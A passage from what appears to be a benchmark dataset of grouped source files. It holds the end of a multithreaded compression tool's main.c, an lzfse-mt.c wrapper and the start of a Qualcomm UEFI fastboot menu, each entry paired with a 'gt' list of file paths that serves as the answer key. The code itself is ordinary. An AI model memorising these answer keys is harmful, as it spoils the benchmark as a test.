TO, THE IMPLIED\"\n\t       \"\\n WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\"\n\t       \"\\n DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR\"\n\t       \"\\n ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\"\n\t       \"\\n (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\"\n\t       \"\\n LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON\"\n\t       \"\\n ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\"\n\t       \"\\n (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\"\n\t       \"\\n SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\"\n\t       \"\\n \"\n\t       \"\\n Report bugs to: https:\n\t       \"\\n\");\n\texit(0);\n}\n\nstatic void usage(void)\n{\n\tprintf(\"\\n Usage: %s [OPTION]... [FILE]...\"\n\t       \"\\n Compress or uncompress FILEs (by default, compress FILES in-place).\"\n\t       \"\\n\"\n\t       \"\\n Standard Options:\"\n\t       \"\\n  -#    Set compression level to # (%d-%d, default:%d).\"\n\t       \"\\n  -c    Force write to standard output.\"\n\t       \"\\n  -d    Use decompress mode.\"\n\t       \"\\n  -z    Use compress mode.\"\n\t       \"\\n  -f    Force overwriting files and/or compression.\"\n\t       \"\\n  -o F  Write output to file `F`, stdout is used for `-`.\"\n\t       \"\\n  -h    Display a help screen and quit.\"\n\t       \"\\n  -k    Keep input files after compression or decompression.\"\n\t       \"\\n  -l    List information for the specified compressed files.\"\n\t       \"\\n  -L    Display License and quit.\"\n\t       \"\\n  -q    Be quiet: suppress all messages.\"\n\t       \"\\n  -S X  Use suffix 'X' for compressed files. Default: \\\"%s\\\"\"\n\t       \"\\n  -t    Test the integrity of each file leaving any files intact.\"\n\t       \"\\n  -v    Be more verbose.\"\n\t       \"\\n  -V    Show version information and quit.\"\n\t       \"\\n\"\n\t       \"\\n Additional Options:\"\n\t       \"\\n  -T N  Set number of (de)compression threads (def: #cores).\"\n\t       \"\\n  -b N  Set input chunksize to N MiB (default: auto).\"\n\t       \"\\n  -i N  Set number of iterations for testing (default: 1).\"\n\t       \"\\n  -B    Print timings and memory usage to stderr.\"\n\t       \"\\n  -C    Disable crc32 calculation in verbose listing mode.\"\n\t       \"\\n\"\n\t       \"\\n If invoked as '%s', default action is to compress.\"\n\t       \"\\n             as '%s',  default action is to decompress.\"\n\t       \"\\n             as '%s', then: force decompress to stdout.\"\n\t       \"\\n\"\n\t       \"\\n With no FILE, or when FILE is -, read standard input.\"\n\t       \"\\n\"\n\t       \"\\n Report bugs to: https:\n\t       \"\\n\",\n\t       PROGNAME, LEVEL_MIN, LEVEL_MAX, LEVEL_DEF, SUFFIX,\n\t       PROGNAME, UNZIP, ZCAT);\n\n\texit(0);\n}\n\nstatic void headline(void)\n{\n\tif (opt_timings && opt_verbose && opt_mode <= MODE_DECOMPRESS)\n\t\tfprintf(stderr, \"Level;Threads;InSize;OutSize;Frames\\n\");\n}\n\nstatic int ReadData(void *arg, MT_Buffer * in)\n{\n\tFILE *fd = (FILE *) arg;\n\tsize_t done = fread(in->buf, 1, in->size, fd);\n\tin->size = done;\n\n\tif (opt_mode == MODE_LIST && opt_verbose)\n\t\tbytes_read += done;\n\n\treturn 0;\n}\n\nstatic int WriteData(void *arg, MT_Buffer * out)\n{\n\tFILE *fd = (FILE *) arg;\n\tssize_t done = fwrite(out->buf, 1, out->size, fd);\n\n\n\tif (opt_mode == MODE_LIST && opt_verbose > 1)\n\t\tcrc = crc32(out->buf, out->size, crc);\n\n\n\tout->size = done;\n\n\tif (opt_mode == MODE_LIST && opt_verbose)\n\t\tbytes_written += done;\n\n\treturn 0;\n}\n\n\nstatic const char *do_compress(FILE * in, FILE * out)\n{\n\tstatic int first = 1;\n\tMT_RdWr_t rdwr;\n\tsize_t ret;\n\n\tif (first) {\n\t\theadline();\n\t\tfirst = 0;\n\t}\n\n\tif (opt_timings && opt_verbose && opt_mode == MODE_COMPRESS)\n\t\tgettimeofday(&tms, NULL);\n\n\n\trdwr.fn_read = ReadData;\n\trdwr.fn_write = WriteData;\n\trdwr.arg_read = (void *)in;\n\trdwr.arg_write = (void *)out;\n\n\n\tcctx = MT_createCCtx(opt_threads, opt_level, opt_bufsize);\n\tif (!cctx)\n\t\treturn \"Allocating compression context failed!\";\n\n\n\tret = MT_compressCCtx(cctx, &rdwr);\n\tif (MT_isError(ret))\n\t\treturn MT_getErrorString(ret);\n\n\n\tif (opt_timings && opt_verbose && opt_mode == MODE_COMPRESS)\n\t\tfprintf(stderr, \"%d;%d;%lu;%lu;%lu\\n\",\n\t\t\topt_level, opt_threads,\n\t\t\t(unsigned long)MT_GetInsizeCCtx(cctx),\n\t\t\t(unsigned long)MT_GetOutsizeCCtx(cctx),\n\t\t\t(unsigned long)MT_GetFramesCCtx(cctx));\n\n\tMT_freeCCtx(cctx);\n\n\treturn 0;\n}\n\n\nstatic const char *do_decompress(FILE * in, FILE * out)\n{\n\tstatic int first = 1;\n\tMT_RdWr_t rdwr;\n\tsize_t ret;\n\n\tif (first) {\n\t\theadline();\n\t\tfirst = 0;\n\t}\n\n\tif (opt_timings && opt_verbose && opt_mode == MODE_DECOMPRESS)\n\t\tgettimeofday(&tms, NULL);\n\n\n\trdwr.fn_read = ReadData;\n\trdwr.fn_write = WriteData;\n\trdwr.arg_read = (void *)in;\n\trdwr.arg_write = (void *)out;\n\n\n\tdctx = MT_createDCtx(opt_threads, opt_bufsize);\n\tif (!dctx)\n\t\treturn \"Allocating decompression context failed!\";\n\n\n\tret = MT_decompressDCtx(dctx, &rdwr);\n\tif (MT_isError(ret))\n\t\treturn MT_getErrorString(ret);\n\n\n\tif (opt_timings && opt_verbose && opt_mode == MODE_DECOMPRESS)\n\t\tfprintf(stderr, \"%d;%d;%lu;%lu;%lu\\n\",\n\t\t\topt_level, opt_threads,\n\t\t\t(unsigned long)MT_GetInsizeDCtx(dctx),\n\t\t\t(unsigned long)MT_GetOutsizeDCtx(dctx),\n\t\t\t(unsigned long)MT_GetFramesDCtx(dctx));\n\n\tMT_freeDCtx(dctx);\n\n\treturn 0;\n}\n\nstatic int has_suffix(const char *filename, const char *suffix)\n{\n\tint flen = strlen(filename);\n\tint xlen = strlen(suffix);\n\n\tif (flen < xlen)\n\t\treturn 0;\n\n\tif (strcmp(filename + flen - xlen, suffix) == 0)\n\t\treturn 1;\n\n\treturn 0;\n}\n\nstatic char *add_suffix(const char *filename)\n{\n\tint flen = strlen(filename);\n\tint xlen = strlen(opt_suffix);\n\tchar *newname = malloc(flen + xlen + 1);\n\n\tif (!newname)\n\t\tpanic(\"nomem!\");\n\n\tstrcpy(newname, filename);\n\tstrcat(newname, opt_suffix);\n\n\treturn newname;\n}\n\nstatic char *remove_suffix(const char *filename)\n{\n\tint flen = strlen(filename);\n\tint xlen = strlen(opt_suffix);\n\tchar *newname = malloc(flen + xlen + 5);\n\n\tif (!newname)\n\t\tpanic(\"nomem!\");\n\n\tif (has_suffix(filename, opt_suffix)) {\n\n\t\tstrcpy(newname, filename);\n\t\tnewname[flen - xlen] = 0;\n\t} else {\n\n\t\tstrcpy(newname, filename);\n\t\tstrcat(newname, \".out\");\n\t}\n\n\treturn newname;\n}\n\nstatic unsigned int crc32(const unsigned char *buf, size_t size,\n\t\t\t  unsigned int crc)\n{\n\tstatic int initdone = 0;\n\n\tif (opt_nocrc)\n\t\treturn 0;\n\n\tif (!initdone) {\n\t\tunsigned int b, i, r, poly32 = 0xEDB88320U;\n\n\t\tfor (b = 0; b < 256; ++b) {\n\t\t\tr = b;\n\t\t\tfor (i = 0; i < 8; ++i) {\n\t\t\t\tif (r & 1)\n\t\t\t\t\tr = (r >> 1) ^ poly32;\n\t\t\t\telse\n\t\t\t\t\tr >>= 1;\n\t\t\t}\n\n\t\t\tcrc32_table[0][b] = r;\n\t\t}\n\t\tinitdone++;\n\t}\n\tcrc = ~crc;\n\n\twhile (size != 0) {\n\t\tcrc = crc32_table[0][*buf++ ^ (crc & 0xFF)] ^ (crc >> 8);\n\t\t--size;\n\t}\n\n\treturn ~crc;\n}\n\nstatic void print_listmode(int headline, const char *filename)\n{\n\tif (headline && opt_verbose > 1)\n\t\tprintf(\"%8s %8s %10s %8s %20s %20s %7s %s\\n\",\n\t\t       \"method\", \"crc32\", \"date\", \"time\", \"compressed\",\n\t\t       \"uncompressed\", \"ratio\", \"uncompressed_name\");\n\telse if (headline)\n\t\tprintf(\"%20s %20s %7s %s\\n\",\n\t\t       \"compressed\", \"uncompressed\", \"ratio\",\n\t\t       \"uncompressed_name\");\n\n\tif (errmsg) {\n\t\tif (opt_verbose == 1)\n\t\t\tprintf(\"%20s %20s %7s %s\\n\", \"-\", \"-\", \"-\", filename);\n\t\telse if (opt_verbose > 1)\n\t\t\tprintf(\"%8s %8s %10s %8s %20s %20s %7s %s\\n\",\n\t\t\t       \"-\", \"-\", \"-\", \"-\", \"-\", \"-\", \"-\", filename);\n\t} else if (opt_verbose == 1) {\n\t\tprintf(\"%20lu %20lu %6.2f%% %s\\n\",\n\t\t       (unsigned long)bytes_read,\n\t\t       (unsigned long)bytes_written,\n\t\t       100 - (double)bytes_read * 100 / bytes_written,\n\t\t       filename);\n\t} else if (opt_verbose > 1) {\n\t\tchar buf[30];\n\t\tstrftime(buf, sizeof(buf), \"%Y-%m-%d %H:%M:%S\",\n\t\t\t localtime(&mtime));\n\t\tprintf(\"%8s %08x %12s %20lu %20lu %6.2f%% %s\\n\", METHOD, crc,\n\t\t       buf, (unsigned long)bytes_read,\n\t\t       (unsigned long)bytes_written,\n\t\t       100 - (double)bytes_read * 100 / bytes_written,\n\t\t       filename);\n\t}\n\n\treturn;\n}\n\nstatic void print_testmode(const char *filename)\n{\n\tprintf(PROGNAME \": %s: %s\\n\", filename, errmsg ? errmsg : \"OK\");\n}\n\nstatic void check_stdout(void)\n{\n\tif (IS_CONSOLE(fout) && !opt_force)\n\t\tpanic(\"Data not written to terminal. Use -f to force!\");\n}\n\n\nstatic char *check_infile(const char *filename)\n{\n\tstruct stat s;\n\tint r;\n\n\tr = stat(filename, &s);\n\tif (r == -1)\n\t\treturn strerror(errno);\n\n\tif (S_ISDIR(s.st_mode))\n\t\treturn \"Is a directory\";\n\n\tif (S_ISREG(s.st_mode)) {\n\t\tmtime = s.st_mtime;\n\t\treturn 0;\n\t}\n\n\treturn \"Is not regular file\";\n}\n\n\nstatic char *check_overwrite(const char *filename)\n{\n\tstruct stat s;\n\tint r, c, yes = -1;\n\n\n\tif (opt_force)\n\t\treturn 0;\n\n\n\tr = stat(filename, &s);\n\tif (r == -1 && errno == ENOENT)\n\t\treturn 0;\n\n\tif (r == -1)\n\t\treturn strerror(errno);\n\n\n\tif (fin == stdin || fout == stdout)\n\t\tpanic(\"Can not read user input, cause you're piping data.\");\n\n\n\tfor (;;) {\n\t\tprintf(\"%s: '%s' already exists. Overwrite (y/N) ? \",\n\t\t       progname, filename);\n\n\t\tc = getchar();\n\n\t\tif (c == 'y' || c == 'Y')\n\t\t\tyes = 1;\n\t\tif (c == 'n' || c == 'N')\n\t\t\tyes = 0;\n\n\t\twhile (c != '\\n' && c != EOF)\n\t\t\tc = getchar();\n\n\t\tif (yes != -1)\n\t\t\tbreak;\n\t}\n\n\tif (yes == 0 && opt_verbose) {\n\t\treturn \"Not overwriting.\";\n\t}\n\n\tremove(filename);\n\treturn 0;\n}\n\nstatic int str_casestart(const char *a, const char *b)\n{\n\tconst char *s = a;\n\tconst char *t = b;\n\tfor (;;) {\n\t\tunsigned char x, y;\n\t\tif (!*t)\n\t\t\treturn 1;\n\t\tx = *s - 'A';\n\t\tif (x <= 'Z' - 'A')\n\t\t\tx += 'a';\n\t\telse\n\t\t\tx += 'A';\n\t\ty = *t - 'A';\n\t\tif (y <= 'Z' - 'A')\n\t\t\ty += 'a';\n\t\telse\n\t\t\ty += 'A';\n\t\tif (x != y)\n\t\t\tbreak;\n\t\tif (!x)\n\t\t\tbreak;\n\t\t++s;\n\t\t++t;\n\t}\n\treturn 0;\n}\n\nint get_fstat(FILE* file, struct stat* const f_stat)\n{\n\tint fd = fileno(file);\n\tint i = fstat(fd, f_stat);\n\treturn i;\n}\n\nint set_fstat(FILE* file, const char* fname, struct stat* const f_stat)\n{\n\tint fd = fileno(file);\n\tmode_t mode;\n\tint warn = 0;\n\tstruct utimbuf ftm;\n\n\tif (f_stat)\n\t{\n\tmode = f_stat->st_mode;\n\tif(fchmod(fd, mode) != 0)\n\t\twarn = 1;\n\n\tftm.actime = f_stat->st_atime;\n\tftm.modtime = f_stat->st_mtime;\n\tif(utime(fname, &ftm) != 0)\n\t\twarn = 1;\n\t}\n\treturn warn;\n}\n\nstatic void treat_stdin()\n{\n\tconst char *filename = \"(stdin)\";\n\n\n\tif (!fout) {\n\t\tfout = stdout;\n\t\tSET_BINARY(fout);\n\t\tcheck_stdout();\n\t}\n\n\n\tif (opt_mode == MODE_COMPRESS)\n\t\terrmsg = do_compress(fin, fout);\n\telse\n\t\terrmsg = do_decompress(fin, fout);\n\n\n\tif (errmsg) {\n\t\tfprintf(stderr, \"%s: stdin: %s\\n\", progname, errmsg);\n\t\texit_code = E_ERROR;\n\t}\n\n\tif (opt_mode == MODE_LIST)\n\t\tprint_listmode(1, filename);\n\n\n\tif (opt_mode == MODE_TEST && opt_verbose > 1)\n\t\tprint_testmode(filename);\n\n\treturn;\n}\n\nstatic void treat_file(char *filename)\n{\n\tstatic int first = 1;\n\tFILE *local_fout = NULL;\n\tchar *fn2 = 0;\n\tstruct stat fin_stat;\n\n\n\tbytes_written = bytes_read = 0;\n\n\n\terrmsg = 0;\n\tcrc = 0;\n\n\n\tif (strcmp(filename, \"-\") == 0) {\n\t\tfin = stdin;\n\t\tSET_BINARY(fin);\n\t} else {\n\t\terrmsg = check_infile(filename);\n\t\tif (errmsg && opt_verbose)\n\t\t\tfprintf(stderr, \"%s: %s: %s\\n\",\n\t\t\t\tprogname, filename, errmsg);\n\t\tif (errmsg)\n\t\t\treturn;\n\t\tfin = fopen(filename, \"rb\");\n\t\tget_fstat(fin, &fin_stat);\n\t}\n\n\n\tif (global_fout) {\n\t\tlocal_fout = fout;\n\t\tcheck_stdout();\n\t} else {\n\n\t\tswitch (opt_mode) {\n\t\tcase MODE_COMPRESS:\n\t\t\tif (has_suffix(filename, opt_suffix) && !opt_force) {\n\t\t\t\tfprintf(stderr,\n\t\t\t\t\t\"%s already has %s suffix -- unchanged\\n\",\n\t\t\t\t\tfilename, opt_suffix);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tfn2 = add_suffix(filename);\n\t\t\terrmsg = check_overwrite(fn2);\n\t\t\tif (!errmsg)\n\t\t\t\tlocal_fout = fopen(fn2, \"wb\");\n\t\t\tbreak;\n\t\tcase MODE_DECOMPRESS:\n\t\t\tfn2 = remove_suffix(filename);\n\t\t\terrmsg = check_overwrite(fn2);\n\t\t\tif (!errmsg)\n\t\t\t\tlocal_fout = fopen(fn2, \"wb\");\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (!errmsg && fin == NULL)\n\t\terrmsg = \"Opening source file failed.\";\n\n\tif (!errmsg && local_fout == NULL)\n\t\terrmsg = \"Opening destination file failed.\";\n\n\tif (errmsg) {\n\t\tfprintf(stderr, \"%s: %s: %s\\n\", progname, filename, errmsg);\n\t\texit_code = E_WARNING;\n\t\tif (fn2)\n\t\t\tfree(fn2);\n\t\treturn;\n\t}\n\n\n\tif (!errmsg && opt_mode == MODE_COMPRESS)\n\t\terrmsg = do_compress(fin, local_fout);\n\telse\n\t\terrmsg = do_decompress(fin, local_fout);\n\n\n\tif (errmsg) {\n\t\tfprintf(stderr, \"%s: %s: %s\\n\", progname, filename, errmsg);\n\t\texit_code = E_ERROR;\n\t}\n\n\tif (fin && fin != stdin)\n\t\tif (fclose(fin) != 0 && opt_verbose)\n\t\t\tfprintf(stderr, \"Closing infile failed.\");\n\n\n\tif (!global_fout && local_fout != stdout)\n\t{\n\t\tfflush(local_fout);\n\t\tset_fstat(local_fout, fn2, &fin_stat);\n\t\tif (fclose(local_fout) != 0 && opt_verbose)\n\t\t\tfprintf(stderr, \"Closing outfile failed.\");\n\t}\n\n\n\tif (opt_mode == MODE_LIST)\n\t\tprint_listmode(first, filename);\n\n\n\tif (opt_mode == MODE_TEST && opt_verbose > 1)\n\t\tprint_testmode(filename);\n\n\n\tif (!errmsg && !opt_keep)\n\t\tremove(filename);\n\n\n\tif (errmsg && !global_fout) {\n\t\tfprintf(stderr, errmsg);\n\t\tremove(fn2);\n\t}\n\n\n\tif (fn2)\n\t\tfree(fn2);\n\n\tfirst = 0;\n\treturn;\n}\n\n\n\nint main(int argc, char **argv)\n{\n\tif (argc < 2){\n\t\tusage();\n\t\texit(0);\n\t}\n\n\tstruct rusage ru;\n\tint opt;\n\tint files;\n\tint levelnumbers = 0;\n\n\n\tprogname = strrchr(argv[0], PATH_SEPERATOR);\n\tif (progname)\n\t\t++progname;\n\telse\n\t\tprogname = argv[0];\n\n\n\tif (str_casestart(progname, UNZIP)) {\n\t\topt_mode = MODE_DECOMPRESS;\n\t} else if (str_casestart(progname, ZCAT)) {\n\t\topt_mode = MODE_DECOMPRESS;\n\t\topt_stdout = 1;\n\t\topt_force = 1;\n\t}\n\n\n\topt_threads = getcpucount();\n\n\n\twhile ((opt =\n\t\tgetopt(argc, argv,\n\t\t       \"1234567890cdzfo:hklLqrS:tvVT:b:i:BC\")) != -1) {\n\t\tswitch (opt) {\n\n\n\t\tcase '0':\n\t\tcase '1':\n\t\tcase '2':\n\t\tcase '3':\n\t\tcase '4':\n\t\tcase '5':\n\t\tcase '6':\n\t\tcase '7':\n\t\tcase '8':\n\t\tcase '9':\n\t\t\tif (levelnumbers == 0)\n\t\t\t\topt_level = 0;\n\t\t\telse\n\t\t\t\topt_level *= 10;\n\t\t\topt_level += ((int)opt - 48);\n\t\t\tlevelnumbers++;\n\t\t\tbreak;\n\n\t\tcase 'c':\n\t\t\topt_stdout = 1;\n\t\t\topt_keep = 1;\n\t\t\tbreak;\n\n\t\tcase 'd':\n\t\t\topt_mode = MODE_DECOMPRESS;\n\t\t\tbreak;\n\n\t\tcase 'z':\n\t\t\topt_mode = MODE_COMPRESS;\n\t\t\tbreak;\n\n\t\tcase 'f':\n\t\t\topt_force = 1;\n\t\t\tbreak;\n\n\t\tcase 'o':\n\t\t\topt_filename = optarg;\n\t\t\tbreak;\n\n\t\tcase 'h':\n\t\t\tusage();\n\t\t\tbreak;\n\n\t\tcase 'k':\n\t\t\topt_keep = 1;\n\t\t\tbreak;\n\n\t\tcase 'l':\n\t\t\topt_mode = MODE_LIST;\n\t\t\topt_keep = 1;\n\t\t\tbreak;\n\n\t\tcase 'L':\n\t\t\tlicense();\n\t\t\tbreak;\n\n\t\tcase 'q':\n\t\t\topt_verbose = 0;\n\t\t\tbreak;\n\n\t\tcase 'S':\n\t\t\topt_suffix = optarg;\n\t\t\tbreak;\n\n\t\tcase 't':\n\t\t\topt_mode = MODE_TEST;\n\t\t\topt_keep = 1;\n\t\t\tbreak;\n\n\t\tcase 'v':\n\t\t\topt_verbose++;\n\t\t\tbreak;\n\n\t\tcase 'V':\n\t\t\tversion(1);\n\t\t\tbreak;\n\n\n\t\tcase 'T':\n\t\t\topt_threads = atoi(optarg);\n\t\t\tbreak;\n\n\t\tcase 'b':\n\t\t\topt_bufsize = atoi(optarg);\n\t\t\tbreak;\n\n\t\tcase 'i':\n\t\t\topt_iterations = atoi(optarg);\n\t\t\tbreak;\n\n\t\tcase 'B':\n\t\t\topt_timings = 1;\n\t\t\tbreak;\n\n\t\tcase 'C':\n\t\t\topt_nocrc = 1;\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tusage();\n\n\t\t}\n\t}\n\n\n\n\n\tif (opt_level < LEVEL_MIN)\n\t\tusage();\n\telse if (opt_level > LEVEL_MAX)\n\t\tusage();\n\n\n\tif (opt_threads < 1)\n\t\topt_threads = 1;\n\telse if (opt_threads > THREAD_MAX)\n\t\topt_threads = THREAD_MAX;\n\n\n\tif (opt_iterations < 1)\n\t\topt_iterations = 1;\n\telse if (opt_iterations > MAX_ITERATIONS)\n\t\topt_iterations = MAX_ITERATIONS;\n\n\n\tif (opt_bufsize > 0)\n\t\topt_bufsize *= 1024 * 1024;\n\n\n\tfiles = argc - optind;\n\n\n\tif (files == 0) {\n\t\tfin = stdin;\n\t\tSET_BINARY(fin);\n\t}\n\n\n\tif (opt_stdout) {\n\t\tfout = stdout;\n\t\tSET_BINARY(fout);\n\t\tglobal_fout = 1;\n\t}\n\n\n\tif (opt_filename) {\n\t\tif (global_fout)\n\t\t\tpanic(\"Can not use -o FILE together with -c :(\");\n\n\t\tif (strcmp(opt_filename, \"-\") == 0) {\n\t\t\tfout = stdout;\n\t\t\tSET_BINARY(fout);\n\t\t} else {\n\t\t\terrmsg = check_overwrite(opt_filename);\n\t\t\tif (!errmsg)\n\t\t\t\tfout = fopen(opt_filename, \"wb\");\n\t\t\tif (!fout)\n\t\t\t\tpanic(\"Opening output file failed!\");\n\t\t}\n\t\tglobal_fout = 1;\n\t}\n\n\n\tif (opt_mode == MODE_LIST || opt_mode == MODE_TEST) {\n\t\tfout = fopen(DEVNULL, \"wb\");\n\t\tif (!fout)\n\t\t\tpanic(\"Opening dummy output failed!\");\n\t\tglobal_fout = 1;\n\t}\n\n\n\tif (opt_timings && opt_verbose)\n\t\tif (opt_mode == MODE_LIST || opt_mode == MODE_TEST)\n\t\t\tgettimeofday(&tms, NULL);\n\n\n\tif (files == 0) {\n\n\t\tif (opt_iterations != 1)\n\t\t\tpanic\n\t\t\t    (\"You can not use stdin together with the -i option.\");\n\t\ttreat_stdin();\n\t} else {\n\n\t\tfor (;;) {\n\t\t\tfiles = optind;\n\t\t\twhile (files < argc) {\n\t\t\t\ttreat_file(argv[files++]);\n\t\t\t}\n\t\t\topt_iterations--;\n\t\t\tif (opt_iterations == 0)\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\n\tif (opt_timings && opt_verbose) {\n\t\tgettimeofday(&tme, NULL);\n\t\ttimersub(&tme, &tms, &tm);\n\t\tgetrusage(RUSAGE_SELF, &ru);\n\n\t\tfprintf(stderr, \"Real;User;Sys;MaxMem\\n\");\n\t\tfprintf(stderr, \"%ld.%ld;%ld.%ld;%ld.%ld;%ld\\n\",\n\t\t\ttm.tv_sec, tm.tv_usec / 1000,\n\t\t\tru.ru_utime.tv_sec,\n\t\t\tru.ru_utime.tv_usec / 1000,\n\t\t\tru.ru_stime.tv_sec,\n\t\t\tru.ru_stime.tv_usec / 1000,\n\t\t\t(long unsigned)ru.ru_maxrss);\n\t}\n\n\n\texit(exit_code);\n}\n\n\n'zstdmt/programs/lzfse-mt.c'\n:\n\n\n#include \"lzfse-mt.h\"\n\n#define METHOD   \"lzfse\"\n#define PROGNAME \"lzfse-mt\"\n#define UNZIP    \"unlzfse-mt\"\n#define ZCAT     \"lzfsecat-mt\"\n#define SUFFIX   \".lzfse\"\n\n#define LEVEL_DEF          0\n#define LEVEL_MIN          0\n#define LEVEL_MAX          1\n#define THREAD_MAX         LZFSEMT_THREAD_MAX\n\n#define MT_isError         LZFSEMT_isError\n#define MT_getErrorString  LZFSEMT_getErrorString\n#define MT_Buffer          LZFSEMT_Buffer\n#define MT_RdWr_t          LZFSEMT_RdWr_t\n\n#define MT_CCtx            LZFSEMT_CCtx\n#define MT_createCCtx      LZFSEMT_createCCtx\n#define MT_compressCCtx    LZFSEMT_compressCCtx\n#define MT_GetFramesCCtx   LZFSEMT_GetFramesCCtx\n#define MT_GetInsizeCCtx   LZFSEMT_GetInsizeCCtx\n#define MT_GetOutsizeCCtx  LZFSEMT_GetOutsizeCCtx\n#define MT_freeCCtx        LZFSEMT_freeCCtx\n\n#define MT_DCtx            LZFSEMT_DCtx\n#define MT_createDCtx      LZFSEMT_createDCtx\n#define MT_decompressDCtx  LZFSEMT_decompressDCtx\n#define MT_GetFramesDCtx   LZFSEMT_GetFramesDCtx\n#define MT_GetInsizeDCtx   LZFSEMT_GetInsizeDCtx\n#define MT_GetOutsizeDCtx  LZFSEMT_GetOutsizeDCtx\n#define MT_freeDCtx        LZFSEMT_freeDCtx\n\n#include \"main.c\"\n",
        "gt": [
            "'zstdmt/programs/platform.h'",
            "'zstdmt/programs/main.c'",
            "'zstdmt/programs/lzfse-mt.c'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/FastbootMenu.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFILimits.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/UpdateDeviceTree.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/FastbootMenu.c'\n:\n#include \"AutoGen.h\"\n#include <Library/BaseLib.h>\n#include <Library/BaseMemoryLib.h>\n#include <Library/DebugLib.h>\n#include <Library/DeviceInfo.h>\n#include <Library/DrawUI.h>\n#include <Library/FastbootMenu.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/MenuKeysDetection.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UpdateDeviceTree.h>\n#include <Library/BootLinux.h>\n#include <Protocol/EFIVerifiedBoot.h>\n#include <Uefi.h>\n\nSTATIC OPTION_MENU_INFO gMenuInfo;\n\nSTATIC MENU_MSG_INFO mFastbootOptionTitle[] = {\n    {{\"Start\"},\n     BIG_FACTOR,\n     BGR_GREEN,\n     BGR_BLACK,\n     OPTION_ITEM,\n     0,\n     RESTART},\n    {{\"Restart bootloader\"},\n     BIG_FACTOR,\n     BGR_RED,\n     BGR_BLACK,\n     OPTION_ITEM,\n     0,\n     FASTBOOT},\n    {{\"Recovery Mode\"},\n     BIG_FACTOR,\n     BGR_RED,\n     BGR_BLACK,\n     OPTION_ITEM,\n     0,\n     RECOVER},\n    {{\"Power off\"},\n     BIG_FACTOR,\n     BGR_WHITE,\n     BGR_BLACK,\n     OPTION_ITEM,\n     0,\n     POWEROFF},\n    {{\"Boot to FFBM\"},\n     BIG_FACTOR,\n     BGR_YELLOW,\n     BGR_BLACK,\n     OPTION_ITEM,\n     0,\n     FFBM},\n    {{\"Boot to QMMI\"},\n     BIG_FACTOR,\n     BGR_YELLOW,\n     BGR_BLACK,\n     OPTION_ITEM,\n     0,\n     QMMI},\n};\n\nSTATIC MENU_MSG_INFO mFastbootCommonMsgInfo[] = {\n    {{\"\\nPress Volume Up or Down button to change selection\\n\"\n      \"Press Power button to select\\n\\n\"},\n     COMMON_FACTOR,\n     BGR_WHITE,\n     BGR_BLACK,\n     COMMON,\n     0,\n     NOACTION},\n    {{\"Device Info\"},\n     COMMON_FACTOR,\n     BGR_RED,\n     BGR_BLACK,\n     COMMON,\n     0,\n     NOACTION},\n    {{\"Product Name - \"},\n     COMMON_FACTOR,\n     BGR_WHITE,\n     BGR_BLACK,\n     COMMON,\n     0,\n     NOACTION},\n    {{\"Variant - \"},\n     COMMON_FACTOR,\n     BGR_WHITE,\n     BGR_BLACK,\n     COMMON,\n     0,\n     NOACTION},\n    {{\"Bootloader Version - \"},\n     COMMON_FACTOR,\n     BGR_WHITE,\n     BGR_BLACK,\n     COMMON,\n     0,\n     NOACTION},\n    {{\"Baseband Version - \"},\n     COMMON_FACTOR,\n     BGR_WHITE,\n     BGR_BLACK,\n     COMMON,\n     0,\n     NOACTION},\n    {{\"Serial Number - \"},\n     COMMON_FACTOR,\n     BGR_WHITE,\n     BGR_BLACK,\n     COMMON,\n     0,\n     NOACTION},\n    {{\"Secure Boot - \"},\n     COMMON_FACTOR,\n     BGR_WHITE,\n     BGR_BLACK,\n     COMMON,\n     0,\n     NOACTION},\n    {{\"Device State - \"},\n     COMMON_FACTOR,\n     BGR_RED,\n     BGR_BLACK,\n     COMMON,\n     0,\n     NOACTION},\n};\n\n\nEFI_STATUS\nUpdateFastbootOptionItem (UINT32 OptionItem, UINT32 *pLocation)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  UINT32 Location = 0;\n  UINT32 Height = 0;\n  MENU_MSG_INFO *FastbootLineInfo = NULL;\n\n  FastbootLineInfo = AllocateZeroPool (sizeof (MENU_MSG_INFO));\n  if (FastbootLineInfo == NULL) {\n    DEBUG ((EFI_D_ERROR, \"Failed to allocate zero pool.\\n\"));\n    return EFI_OUT_OF_RESOURCES;\n  }\n\n  SetMenuMsgInfo (FastbootLineInfo, \"__________\", COMMON_FACTOR,\n                  mFastbootOptionTitle[OptionItem].FgColor,\n                  mFastbootOptionTitle[OptionItem].BgColor, LINEATION, Location,\n                  NOACTION);\n  Status = DrawMenu (FastbootLineInfo, &Height);\n  if (Status != EFI_SUCCESS)\n    goto Exit;\n  Location += Height;\n\n  mFastbootOptionTitle[OptionItem].Location = Location;\n  Status = DrawMenu (&mFastbootOptionTitle[OptionItem], &Height);\n  if (Status != EFI_SUCCESS)\n    goto Exit;\n  Location += Height;\n\n  FastbootLineInfo->Location = Location;\n  Status = DrawMenu (FastbootLineInfo, &Height);\n  if (Status != EFI_SUCCESS)\n    goto Exit;\n  Location += Height;\n\nExit:\n  FreePool (FastbootLineInfo);\n  FastbootLineInfo = 